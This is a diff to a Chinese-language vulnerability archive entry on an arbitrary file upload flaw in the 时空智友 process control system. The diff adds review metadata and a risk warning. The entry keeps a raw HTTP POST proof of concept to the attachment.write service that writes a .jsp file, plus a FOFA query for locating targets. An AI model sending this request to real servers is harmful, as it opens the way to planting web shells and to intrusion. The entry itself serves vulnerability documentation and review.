@@ -1,11 +1,51 @@
 ---
-fofa: "查询语句"
 source: "MrWQ/vulnerability-paper"
+title: "时空智友 attachment.write文件上传"
+product: "时空智友"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "V10.1声明"
+prerequisites: "请求无Cookie未知"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/5MqOwaIupa0sRjju92UD0A"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%E9%99%84%20POC.md"
+fofa_unverified: "查询语句"
+id: "vw-1b4dbe8c89b51aa302062e8b"
+entity_id: "ve-1b4dbe8c89b51aa302062e8b"
+schema_version: "1"
 ---
 
-# 时空智友企业流程化管控系统文件存在任意文件上传漏洞 附 POC
+# 时空智友 attachment.write文件上传
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：时空智友；attachment.write文件上传
+- 版本、配置及部署条件：V10.1声明
+- 认证与权限前提：请求无Cookie未知
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 纯数字写jsp仅证文件落地可读，称shell地址不准确
+- 有响应文件名拼接说明可补64，但版本尚无build
+- FOFA字段仅查询语句，标题重复/空编号/广告下载门槛需清理
+- 官方域有来源但未具体修复
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5MqOwaIupa0sRjju92UD0A)
 
 时空智友企业流程化管控系统文件存在任意文件上传漏洞 附 POC
@@ -50,18 +90,19 @@ app="时空智友 V10.1"
 
 漏洞数据包：
 
-```
+```http
 POST http://127.0.0.1/formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1
 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
 Accept-Encoding: gzip, deflate
 Accept: */*
 Connection: keep-alive
-Content-Length: 9
 
 192513411
 
 
 ```
+
+> 请求长度说明：原资料 Content-Length 为 9；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 上传成功后，会返回文件名。 
 
